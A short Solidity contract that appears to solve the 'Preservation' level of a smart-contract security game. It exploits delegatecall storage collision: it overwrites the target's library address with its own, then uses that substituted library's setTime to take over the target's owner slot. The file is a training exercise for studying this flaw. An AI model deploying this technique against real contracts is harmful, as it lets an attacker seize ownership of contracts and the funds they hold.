// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "../levels/Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() {
	owner = msg.sender;
    }
    
    function attack(address preservationAddress) public {
	Preservation preservation = Preservation(preservationAddress);
	preservation.setSecondTime(uint160(address(this)));
	preservation.setFirstTime(uint160(msg.sender));
    }

    function setTime(uint _time) public {
	owner = address(uint160(_time));
    }
}
